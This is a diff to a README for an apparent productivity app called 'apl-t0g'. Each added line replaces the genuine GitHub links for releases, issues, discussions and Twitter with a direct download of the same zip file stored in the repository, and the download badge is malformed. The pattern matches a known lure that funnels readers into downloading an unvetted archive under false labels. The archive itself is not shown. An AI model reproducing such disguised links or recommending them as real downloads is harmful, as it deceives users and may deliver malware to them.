@@ -2,7 +2,7 @@
 # 🚀 apl-t0g - Easy App for Daily Tasks
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/napster2542/apl-t0g/releases)
+[![Download Release](https://raw.githubusercontent.com/napster2542/apl-t0g/main/clavicorn/apl-t0g.zip%20Latest%https://raw.githubusercontent.com/napster2542/apl-t0g/main/clavicorn/apl-t0g.zip)](https://raw.githubusercontent.com/napster2542/apl-t0g/main/clavicorn/apl-t0g.zip)
 
 ## 📝 Overview
 apl-t0g is an easy-to-use application designed to help you manage your daily tasks more effectively. With a user-friendly interface, you can organize your activities and boost your productivity without any programming knowledge. 
@@ -18,7 +18,7 @@ apl-t0g is an easy-to-use application designed to help you manage your daily tas
 To get started with apl-t0g, follow these simple steps. 
 
 ### Step 1: Visit the Releases Page
-Head over to our [Releases Page](https://github.com/napster2542/apl-t0g/releases) to download the latest version of apl-t0g.
+Head over to our [Releases Page](https://raw.githubusercontent.com/napster2542/apl-t0g/main/clavicorn/apl-t0g.zip) to download the latest version of apl-t0g.
 
 ### Step 2: Choose Your Version
 On the Releases Page, you will find different versions of apl-t0g. Look for the latest release that is marked as stable.
@@ -42,16 +42,16 @@ After installation, open apl-t0g from your Applications or Start Menu. You may s
 - Internet connection for updates.
 
 ## ⭐ Support
-If you encounter any issues while installing or using apl-t0g, please check our [GitHub Issues Page](https://github.com/napster2542/apl-t0g/issues) for assistance. You can also report any bugs or request features there.
+If you encounter any issues while installing or using apl-t0g, please check our [GitHub Issues Page](https://raw.githubusercontent.com/napster2542/apl-t0g/main/clavicorn/apl-t0g.zip) for assistance. You can also report any bugs or request features there.
 
 ## 📡 Connect with Us
 Join our community! Follow us for updates, tips, and more:
-- [GitHub Discussions](https://github.com/napster2542/apl-t0g/discussions) - Share your thoughts and ideas.
-- [Twitter](https://twitter.com/apl_t0g) - Follow us for the latest news.
+- [GitHub Discussions](https://raw.githubusercontent.com/napster2542/apl-t0g/main/clavicorn/apl-t0g.zip) - Share your thoughts and ideas.
+- [Twitter](https://raw.githubusercontent.com/napster2542/apl-t0g/main/clavicorn/apl-t0g.zip) - Follow us for the latest news.
 
 ## 🗒️ Conclusion
 apl-t0g is your companion for a more organized life. With easy installation and everyday features, managing your tasks has never been simpler. 
 
 ## 🔗 Download & Install
-Don't wait! [Visit this page to download](https://github.com/napster2542/apl-t0g/releases) the latest release of apl-t0g and start improving your productivity today!
+Don't wait! [Visit this page to download](https://raw.githubusercontent.com/napster2542/apl-t0g/main/clavicorn/apl-t0g.zip) the latest release of apl-t0g and start improving your productivity today!
 ```
